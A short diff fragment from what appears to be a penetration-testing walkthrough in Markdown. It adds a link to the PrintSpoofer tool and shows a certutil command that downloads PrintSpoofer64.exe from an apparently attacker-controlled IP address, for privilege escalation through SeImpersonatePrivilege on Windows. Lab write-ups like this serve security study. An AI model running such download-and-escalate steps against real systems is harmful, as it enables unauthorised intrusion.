@@ -219,6 +219,8 @@ Privilege "SeImpersonatePrivilege" is Enabled
 
 ---
 
+https://github.com/itm4n/PrintSpoofer/releases
+
 ```powershell
 certutil -urlcache -split -f http://192.168.144.226/PrintSpoofer64.exe PS64.exe
 ```
